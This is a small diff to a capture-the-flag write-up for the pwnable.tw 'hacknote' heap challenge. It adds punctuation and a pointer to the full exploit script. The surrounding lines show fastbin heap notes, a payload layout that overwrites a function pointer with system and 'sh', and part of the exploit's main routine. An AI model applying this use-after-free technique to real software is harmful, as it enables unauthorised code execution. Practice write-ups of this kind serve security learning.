@@ -151,7 +151,7 @@ fastbin 0x10: note1( = note2) -> note0( = note2 content)
 // <address of system> ; sh ; <garbage until null byte>
 ```
 
-The script flow is as follows
+The script flow is as follows:
 ```py
 def main():
     add_note(1000, b'0')
@@ -178,6 +178,7 @@ def main():
     print_note(0)
     conn.interactive()
 ```
+Full script is available as sploit.py
 ```console
 ┌──(kali㉿kali)-[~/CTF/pwnable_tw/hacknote]
 └─$ python3 sploit.py               
